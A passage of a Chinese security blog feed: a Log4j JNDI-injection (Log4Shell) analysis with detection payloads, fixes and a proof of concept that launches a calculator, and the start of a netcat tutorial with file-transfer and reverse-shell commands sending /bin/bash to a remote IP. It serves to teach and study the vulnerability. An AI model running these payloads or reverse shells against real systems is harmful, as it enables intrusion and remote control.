class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">source</span>&gt;</span>$&#123;java.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span>$&#123;java.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">encoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">encoding</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">compilerArguments</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">bootclasspath</span>&gt;</span>$&#123;java.home&#125;/lib/rt.jar<span class="hljs-tag">&lt;/<span class="hljs-name">bootclasspath</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">compilerArguments</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>注意：plugin标签要包裹在plugins中，plugins要包裹在build中</p></blockquote><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p>一般将日志对象定义为当前类等静态私有成员</p><h3 id="使用占位符-打印日志"><a href="#使用占位符-打印日志" class="headerlink" title="使用占位符{}打印日志"></a>使用占位符{}打印日志</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;bob&quot;</span>;<br><br>    logger.error(<span class="hljs-string">&quot;&#123;&#125; is not exited!&quot;</span>,user);<br>&#125;<br></code></pre></td></tr></table></figure><p>成功打印</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232469.jpg" alt="image-20221002151825195"></p><h3 id="lookups"><a href="#lookups" class="headerlink" title="lookups"></a>lookups</h3><p>可以通过<code>$&#123;xxx:xxx&#125;</code>等形式快速获取运行应用容器的docker属性，环境变量，日志事件，Java应用程序环境信息等内容。</p><h1 id="漏洞及分析"><a href="#漏洞及分析" class="headerlink" title="漏洞及分析"></a>漏洞及分析</h1><h3 id="影响版本范围"><a href="#影响版本范围" class="headerlink" title="影响版本范围"></a>影响版本范围</h3><p>2.0-beta9 &lt;&#x3D; Apache Log4j &lt;&#x3D; 2.15.0-rc1（1.x不受影响）</p><p>需要导入log4j-core才行</p><p>先用2.14.0做实验(JDK 1.8下)</p><blockquote><p>原理：JNDI注入</p></blockquote><h2 id="利用lookups获取敏感信息"><a href="#利用lookups获取敏感信息" class="headerlink" title="利用lookups获取敏感信息"></a>利用lookups获取敏感信息</h2><p>输出JDK版本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">LOGGER.error(<span class="hljs-string">&quot;Java version :&#123;&#125;&quot;</span>,<span class="hljs-string">&quot;$&#123;java:version&#125;&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232986.jpg" alt="image-20221002153617894"></p><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>组件中lookup功能的实现类JndiLookup的设计缺陷导致，这个类是在Log4j-core-xxx.jar，所以这个漏洞和Log4j-core有关</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232662.jpg" alt="image-20221002153838589"></p><p>在调用lookup方法处打断点</p><p>JNDI lookup的方法调用在InitialContext.java中</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232530.jpg" alt="image-20221002154141225"></p><h3 id="Debug过程"><a href="#Debug过程" class="headerlink" title="Debug过程"></a>Debug过程</h3><p>测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">logger.error(<span class="hljs-string">&quot;野猪热恋$&#123;jndi:ldap://atf6sq.dnslog.cn&#125;&quot;</span>);<br></code></pre></td></tr></table></figure><p>直接传入的就是${}中的内容(没有过滤),也没有传入其他部分</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232515.jpg" alt="image-20221002154417043"></p><p>查看执行链过程,该lookup方法后续在JndiLookup中被调用</p><p><img src="/../../../../Pictures/%60log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%60/006y8mN6gy1h6qzrx5jggj30u204wgm9.jpg" alt="image-20221002154907000"></p><p>过程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">JndiLookup.java:<br>var6 = Objects.toString(jndiManager.lookup(jndiName), (String)<span class="hljs-literal">null</span>);<br><br>JndiManager.java:<br><span class="hljs-keyword">public</span> T <span class="hljs-title function_">lookup</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String name)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.context.lookup(name);<br>&#125;<br><br>Context.java:<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">lookup</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> NamingException;<br><br>InitialContext.java<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">lookup</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br><span class="hljs-keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);<br>&#125;<br></code></pre></td></tr></table></figure><p>之后处理变量的工作交给了StrSubstitutor这个类</p><p>之后又调用了MessagePatternConverter这个类的format方法</p><ol><li>首先是noLookups这个属性，设置成了false，导致下面代码的执行（现在漏洞修复将这个noLookups设置成true）</li><li>后面的if明显是要定位到<code>$&#123;</code>（并且是连续的），如果有这两个字符就去replace函数替换</li><li>config.getStrSubstitutor()就是上面说的StrSubstitutor</li></ol><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232226.jpg" alt="image-20221002160354461"></p><blockquote><p>Log4j将要输出的日志拼接成字符串之后，它会去判断字符串中是否包含${和},如果包含了，就会当作变量交给StrSubstitutor这个类去处理。</p></blockquote><p>StrSubstitutor中resolveVariable方法获取${}中字符串</p><p><img src="/../../../../Pictures/%60log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%60/006y8mN6gy1h6r0jtfl7mj31ck05ojt3.jpg" alt="image-20221002161555507"></p><p>可以看到resolver中的内容，可以看到Lookups定义了12种处理类型，如果能匹配到这几种处理类型，就交给它们去处理，其他的都会交给defaultLookup去处理。</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232081.jpg" alt="image-20221002161942852"></p><blockquote><p>如果我们的日志内容中有<code>$&#123;jndi:rmi://127.0.0.1:1099/hello&#125;</code>这些内容，去掉${和}传递给resolver的就是<code>jndi:rmi://127.0.0.1:1099/hello</code>。resolver会将第一个”:”之前的内容和lookups做匹配，我们这里获取到的是jndi，就会将剩余部分<code>jndi:rmi://127.0.0.1:1099/hello</code>交给jdni的处理器JndiLookup去处理。</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232251.jpg" alt="image-20221002162800611"></p></blockquote><p>传入是信息debug标注，最好用的lookup.lookup也是JNDI的lookup</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232513.jpg" alt="image-20221002162941649"></p><blockquote><p>从而得到了lookup的结果</p></blockquote><h3 id="noLookups相关"><a href="#noLookups相关" class="headerlink" title="noLookups相关"></a>noLookups相关</h3><p>调用formate</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232599.jpg" alt="image-20221002171504977"></p><p>赋值操作（位于 MessagePatternConverter类中）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-type">int</span> <span class="hljs-variable">noLookupsIdx</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.loadNoLookups(options);<br>        <span class="hljs-built_in">this</span>.noLookups = Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS || noLookupsIdx &gt;= <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">loadNoLookups</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] options)</span> &#123;<br>        <span class="hljs-keyword">if</span> (options != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; options.length; ++i) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">option</span> <span class="hljs-operator">=</span> options[i];<br>                <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;nolookups&quot;</span>.equalsIgnoreCase(option)) &#123;<br>                    <span class="hljs-keyword">return</span> i;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><blockquote><p>由于调用 MessagePatternConverter类的format方法 没有传入options且config非空，并且环境变量也没有设置因此noLookups为false</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232069.jpg" alt="image-20221002190435592"></p></blockquote><h3 id="漏洞检测方法"><a href="#漏洞检测方法" class="headerlink" title="漏洞检测方法"></a>漏洞检测方法</h3><p>通过dnslog，还能查看jdk版本是否支持RMI或者ldap服务</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">$&#123;jndi:dns://$&#123;<span class="hljs-keyword">sy</span><span class="hljs-variable">s:java</span>.<span class="hljs-keyword">version</span>&#125;.dnslog/&#125;<br></code></pre></td></tr></table></figure><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>1、升级到2.17.0版本及以上</p><p>2、参数、环境设置</p><ul><li><p>设置jvm参数：-Dlog4j2.formatMsgNoLookups&#x3D;true，</p></li><li><p>设置系统环境变量：FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS&#x3D;true</p></li></ul><blockquote><p>JNDI可访问的现有的目录及服务有:JDBC、LDAP、RMI、DNS、NIS、CORBA</p></blockquote><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>JDK：11.0.15</p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>JNDI相当于自己做一个服务，如果访问了会直接在放我这本机上执行方法中的代码</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232104.jpg" alt="image-20221002194642057"></p><h2 id="简单复现"><a href="#简单复现" class="headerlink" title="简单复现"></a>简单复现</h2><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072233648.jpg" alt="tststst"></p><p>RMIServer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.cui.log4jtest.rmi;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>            <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry();<br><br>            System.out.println(<span class="hljs-string">&quot;RMI Listener 1099 port&quot;</span>);<br>            <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;com.cui.log4jtest.rmi.EvilObj&quot;</span>, <span class="hljs-string">&quot;com.cui.log4jtest.rmi.EvilObj&quot;</span>, <span class="hljs-literal">null</span>);<br><br>            <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>            registry.rebind(<span class="hljs-string">&quot;test&quot;</span>, referenceWrapper);<br><br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>EvilObj.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.Name;<br><span class="hljs-keyword">import</span> javax.naming.spi.ObjectFactory;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilObj</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectFactory</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;open a Calculator!&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;open -a Calculator&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-comment">//这里可以写任意代码，比如木马程序，病毒程序，死循环，后门程序等等。</span><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>log4jDemo1.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">log4jDemo1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;$&#123;jndi:rmi://127.0.0.1:1099/test&#125;&quot;</span>;<br>            logger.info(<span class="hljs-string">&quot;输出的信息是:&#123;&#125;&quot;</span>, str);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>先启动RMIServer再启动log4jDemo1就会弹出计算器</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072231797.jpg" alt="image-20221002215727110"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072231698.jpg" alt="image-20221002215800340"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nc命令学习及反弹shell细节</title>
      <link href="/2022/09/27/nc%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82/"/>
      <url>/2022/09/27/nc%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82/</url>
      
        <content type="html"><![CDATA[<h1 id="nc命令学习及反弹shell细节"><a href="#nc命令学习及反弹shell细节" class="headerlink" title="nc命令学习及反弹shell细节"></a>nc命令学习及反弹shell细节</h1><table><thead><tr><th align="left">机器名称</th><th align="left">IP地址</th><th>操作系统</th></tr></thead><tbody><tr><td align="left">root@Decemberus</td><td align="left">114.223.4.218</td><td>Centos7</td></tr><tr><td align="left">root@Sloth</td><td align="left">124.223.207.184</td><td>Centos7</td></tr><tr><td align="left">🥣</td><td align="left">内网</td><td>Mac os</td></tr></tbody></table><h2 id="nc命令使用"><a href="#nc命令使用" class="headerlink" title="nc命令使用"></a>nc命令使用</h2><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><ul><li><p><code>netcat-traditional</code>:Kali Linux 默认带的就是这个版本，这个版本的 nc 具有<code>-e</code>选项，十分方便反弹 shell 使用</p></li><li><p><code>netcat-openbsd</code>:ubuntu 里默认的 nc 命令指向的是netcat-openbsd。这个版本因为考虑到安全性等原因没有<code>-e</code>选项。</p></li><li><p><code>ncat</code>:CentOS、Red Hat 默认带的是 ncat。目前ncat已经集成到了 nmap 里面，安装完 nmap 后就可以使用<code>ncat</code>命令了</p></li></ul><blockquote><p>mac上自带nc命令指向的是ncat,linux上nc与ncat没什么区别，mac上最好用ncat,options比较全</p></blockquote><h3 id="前提条件及注意事项"><a href="#前提条件及注意事项" class="headerlink" title="前提条件及注意事项"></a>前提条件及注意事项</h3><ul><li><p>只能nc拥有公网ip的机器，或是在同一局域网下的内网机器(可以nc内网ip)</p></li><li><p>获取本机公网ip</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl ifconfig.me <br></code></pre></td></tr></table></figure></li><li><p>端口放行：如果是购买了腾讯云服务，要在控制台和宝塔面板同时放行端口(用于TCP连接)</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310253657.jpg" alt="image-20220926010406603"></p></li><li><p>需要vps先监听，目标服务器再nc vps，直接nc只能通过udp连接，tcp连接显示拒绝(如果是端口未放行会显示连接超时)</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310254528.jpg" alt="image-20220926005629905"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310254598.jpg" alt="image-20220926005900622"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">未放行端口</span><br>[root@Decemberus ~]# nc 124.223.207.184 3345<br>Ncat: Connection timed out.<br></code></pre></td></tr></table></figure></li></ul><h3 id="文字交互"><a href="#文字交互" class="headerlink" title="文字交互"></a>文字交互</h3><p><code>-l</code>：使用监听模式，监控传入的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -l 3344 <span class="hljs-comment"># 监听3344端口</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310254143.jpg" alt="image-20220926004654073"></p><blockquote><p>只是简单的文字交互，相当于聊天工具，对数据编码没有要求，但无法执行系统命令</p></blockquote><h3 id="命令交互"><a href="#命令交互" class="headerlink" title="命令交互"></a>命令交互</h3><p><code>-e</code>：将传入的信息以命令执行</p><p>将<code>/bin/bash</code>通过 3344 端口来监听，将收到的信息都发送到<code>/bin/bash</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ncat -l -e /bin/bash 3344<br></code></pre></td></tr></table></figure><blockquote><p><code>/bin/bash</code>是shell解释器，根据目标机器，也可以使用<code>/bin/sh</code>或<code>/bin/zsh</code></p><p>访问端可以通过nc该系统的2333端口，输入端指令会传入该系统的&#x2F;bin&#x2F;bash 执行成功后会返回信息，类似于ssh操作连接来该系统一样</p></blockquote><h3 id="持久监听"><a href="#持久监听" class="headerlink" title="持久监听"></a>持久监听</h3><p><code>-k</code>: 客户端断掉连接时，服务端依然保持运行<br><code>-v</code>：现实指令执行过程细节</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ncat -lvk -e  /bin/bash 2333<br></code></pre></td></tr></table></figure><blockquote><p>客户端使用<code>CTRL + c</code>或<code>CTRL + d</code>断开连接的时候，监听端的 ncat 依然在运行，这样方便客户端下次直接 nc 连进来</p></blockquote><h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><h4 id="上传文件到远程"><a href="#上传文件到远程" class="headerlink" title="上传文件到远程"></a>上传文件到远程</h4><p>root@Sloth远程服务器运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ncat -l 3344 &gt; hello.txt<br></code></pre></td></tr></table></figure><p>macOS 本地运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ncat 124.223.207.184 3344 &lt; hello.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255144.jpg" alt="image-20220926011113841"></p><blockquote><p>此时会将 macOS 的文件传输到远程的 CentOS 服务器上，传输完成后，两个 ncat 会话都将终止。</p></blockquote><h4 id="从远程下载文件"><a href="#从远程下载文件" class="headerlink" title="从远程下载文件"></a>从远程下载文件</h4><p>root@Sloth远程服务器运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ncat -l 3344 &lt; hello.txt <br></code></pre></td></tr></table></figure><p>macOS 本地运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ncat 124.223.207.184 3344 &gt; hello.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255056.jpg" alt="image-20220926011518092"></p><blockquote><p>这里文件传输完成后不会显示任何内容，并且两个 Ncat 实例将继续工作(但不能文字和命令交互)</p></blockquote><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>ncat 不支持端口范围扫描，但是原始的 nc (mac上可以用brew装netcat)可以扫描端口</p><ul><li><h4 id="范围扫描"><a href="#范围扫描" class="headerlink" title="范围扫描"></a>范围扫描</h4><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255349.jpg" alt="image-20220926012145161"></p><blockquote><p><code>-n</code>: 直接使用ip地址，而不通过域名服务器<br><code>-z</code>: 使用0输入&#x2F;输出模式%，只在扫描通信端口时使用</p></blockquote></li><li><h4 id="单个扫描"><a href="#单个扫描" class="headerlink" title="单个扫描"></a>单个扫描</h4><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255336.jpg" alt="image-20220926012300304"></p></li></ul><h3 id="vps-nc本机失败可能原因"><a href="#vps-nc本机失败可能原因" class="headerlink" title="vps nc本机失败可能原因"></a>vps nc本机失败可能原因</h3><ul><li><p>本机未监听，tcp连接要让本机先在对应端口监听才能建立，而udp不用，这种情况下一般回显</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">Ncat: Connection refused.<br></code></pre></td></tr></table></figure><p>如果使用原始nc，则表现为没有回显，命令直接结束</p></li><li><p>端口未放行:一般回显表现为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">Ncat: TIMEOUT.<br>或<br>Ncat: Connection timed out.<br></code></pre></td></tr></table></figure><p>如果使用原始nc则是等待较长时间，命令结束，没有回显</p></li><li><p>使用的本机ip不是公网ip</p></li><li><p>经测试，可能是因为端口未放行，这可能需要配置路由器的防火墙</p></li></ul><h3 id="常见options"><a href="#常见options" class="headerlink" title="常见options"></a>常见options</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">-l 启动监听<br>-p&lt;端口号&gt; 表示指定端口<br>-v 显示指令执行过程<br>-u udp连接<br>-n 直接使用ip地址，不用域名解析<br>-w&lt;超时秒数&gt;   设置等待连线的时间<br>-z  使用0输入/输出模式，只在扫描通信端口时使用<br></code></pre></td></tr></table></figure><h2 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>vps监听某个端口，被控制端发起请求到该端口，并将命令行的输入输出传到控制端</p><h3 id="内网弹shell"><a href="#内网弹shell" class="headerlink" title="内网弹shell"></a>内网弹shell</h3><p>ncat的-e 经过简单调整，可以让vps与内网机器进行命令交互</p><p>root@Sloth先监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ncat -lvp 3344<br></code></pre></td></tr></table></figure><p>内网的 macOS 运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ncat -w 10 -e /bin/bash 124.221.124.106 3344<br></code></pre></td></tr></table></figure><p>Linux</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 